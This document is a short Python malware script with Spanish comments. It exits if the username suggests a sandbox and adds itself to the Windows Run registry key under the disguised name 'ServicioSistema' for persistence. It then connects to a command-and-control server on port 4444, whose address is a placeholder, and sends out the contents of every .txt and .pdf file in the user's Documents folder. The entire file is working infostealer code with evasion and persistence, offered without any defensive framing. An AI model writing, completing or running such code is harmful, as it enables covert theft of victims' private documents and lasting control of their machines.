import os
import sys
import socket
import winreg
import urllib.request

def comprobar_entorno_seguro():
    usuario = os.getlogin()
    if usuario in ["Sandbox", "Virustotal", "MalwareTest"]:
        sys.exit()
def asegurar_persistencia():
    ruta_malware = os.path.abspath(__file__)

    clave = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.HKEY_SET_VALUE
    )
    winreg.SetValueEx(clave, "ServicioSistema", 0 , winreg.REG_SZ, ruta_malware)
    winreg.CloseKey(clave)
def conector_comando_control():
    servidor_ip=" numero de servidor a atacar"
    puerto = 4444

    cliente =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cliente.connect((servidor_ip, puerto))
    return cliente

#carga util de ejecucion

def ejecutar_payload(conexion):
    ruta_documento = os.path.expanduser("~/Documents")
    for raiz, carpeta, archivos in os.walk(ruta_documento):
        for archivo in archivos:
            if archivo.endswith(".txt") or archivo.endswith(".pdf"):
                #lee el archivo sensible y lo envias por la conexion de red
                path_completo =os.path.join(raiz, archivo)
                with open(path_completo, "rb") as f:
                    conexion.send(f.read())

if __name__ == "__main__":
    comprobar_entorno_seguro()

    asegurar_persistencia()

    conexion_c2 = conector_comando_control()

    ejecutar_payload(conexion_c2)

    #final del codigo
